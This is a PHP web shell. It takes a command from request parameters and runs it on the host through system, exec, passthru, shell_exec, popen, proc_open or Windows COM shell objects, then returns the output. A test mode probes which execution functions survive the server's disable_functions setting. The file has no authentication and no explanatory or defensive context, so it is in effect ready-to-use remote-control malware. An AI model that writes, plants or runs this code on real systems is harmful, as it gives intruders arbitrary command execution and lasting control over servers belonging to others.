<?php

ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);

$cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : 'whoami';
$cmdPath = isset($_REQUEST['cmdPath']) ? $_REQUEST['cmdPath'] : '';


function msg($text, $type = 0)
{
    $def = "[*]";
    $color = "red";
    if ($type == 1) {
        $def = "[+]";
        $color = "green";
    } elseif ($type == -1) {
        $color = 'black';
        $def = "[-]";
    }
    echo "<br><font face=\"verdana\" color=$color>$def $text</font>";
}

function code($text)
{
    echo "<code style='color: blue;font:11px Monaco,Consolas;'>" . nl2br($text) . "</code>";
}

function _popen($cmd)
{
    $handle = popen($cmd, "r");
    while (!feof($handle)) {
        $out = fgets($handle, 4096);
        code($out);
    }
    pclose($handle);
}

function _proc_open($cmd)
{
    $array = array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w"));
    $handle = proc_open($cmd, $array, $pipes);
    echo stream_get_contents($pipes[1]);
    proc_close($handle);
}

function _WScriptShell($cmd, $cmdPath = "cmd.exe")
{
    $wsh = new COM('WScript.shell');
    $exec = $wsh->exec($cmdPath . ' /c ' . $cmd);
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
}

function _ShellApplication($cmd, $cmdPath = "cmd.exe")
{
    $outFile = sys_get_temp_dir().'\\'."_ShellApplication.log";
    $phpwsh = new COM("Shell.Application") or die("Create Wscript.Shell Failed!");
    $phpwsh->ShellExecute($cmdPath, '/c '.$cmd.' > '.$outFile);
    sleep(1);
    code(file_get_contents($outFile));
    unlink($outFile);
}


if (isset($_REQUEST['action']) and $_REQUEST['action'] == 'test') {
    $func_arr = array('system', 'exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'shell_exec', 'dl', 'mail', 'putenv', 'imap_open', 'symlink');
    $dis_func_arr = explode(",", get_cfg_var("disable_functions"));

    if ($dis_func_arr[0]) {
        foreach ($func_arr as $func) {
            if (!in_array($func, $dis_func_arr)) {
                msg("Function: <strong><a href=http://www.php.net/manual/zh/function.$func.php  target=blank > $func </strong> </a> enable", 1);
                switch ($func) {
                    case 'system':
                        echo '&nbsp;<font face="verdana" size=1>' . $func . '("whoami"): ';
                        $func('whoami');
                        echo '</font>';
                        break;

                    case 'passthru':
                        echo '&nbsp;<font face="verdana" size=1>' . $func . '("whoami"): ';
                        $func('whoami');
                        echo '</font>';
                        break;

                    case 'exec':
                        echo '&nbsp;<font face="verdana" size=1>' . $func . '("whoami"): ';
                        echo $func('whoami');
                        echo '</font>';
                        break;

                    case 'shell_exec':
                        echo '&nbsp;<font face="verdana" size=1>' . $func . '("whoami"): ';
                        echo $func('whoami');
                        echo '</font>';
                        break;

                    case 'popen':
                        echo '&nbsp;<font face="verdana" size=1>' . $func . '("whoami"): ';
                        _popen('whoami');
                        echo '</font>';
                        break;

                    case 'proc_open':
                        echo '&nbsp;<font face="verdana" size=1>' . $func . '("whoami"): ';
                        _proc_open('whoami');
                        echo '</font>';
                        break;
                }
            }
        }
    } else {
        msg("disable_functions not detected", 1);
        echo "<br><br>";

        code("system('whaomi'): ");
        system('whoami');
        echo "<br>";

        code("passthru('whaomi'): ");
        passthru('whoami');
        echo "<br>";

        code("exec('whaomi'): ");
        echo exec('whoami');
        echo "<br>";

        code("shell_exec('whaomi'): ");
        echo shell_exec('whoami');
        echo "<br>";

        code("popen('whaomi'): ");
        _popen('whoami');
        echo "<br>";

        code("proc_open('whaomi'): ");
        _proc_open('whoami');
        echo "<br>";
    }
    if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
        code("_WScriptShell('whaomi'): ");
        _WScriptShell('whoami');
        echo "<br>";

        code("_ShellApplication('whaomi'): ");
        _ShellApplication('whoami');
    }
    exit();
}

if (isset($_REQUEST['action']) and isset($_REQUEST['cmd'])) {
    $action = $_REQUEST['action'];
    $cmd = $_REQUEST['cmd'];
    switch ($action) {
        case 'system':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            system($cmd);
            echo '</code>';
            break;

        case 'passthru':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            passthru($cmd);
            echo '</code>';
            break;

        case 'exec':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            echo exec($cmd);
            echo '</code>';
            break;

        case 'shell_exec':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            echo shell_exec($cmd);
            echo '</code>';
            break;

        case 'popen':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            _popen($cmd);
            echo '</code>';
            break;

        case 'proc_open':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            _proc_open($cmd);
            echo '</code>';
            break;

        case 'ws':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            _WScriptShell($cmd);
            echo '</code>';
            break;

        case 'sa':
            echo "<code style='color: black;font:11px Monaco,Consolas;'>";
            _ShellApplication($cmd);
            echo '</code>';
            break;
    }
}
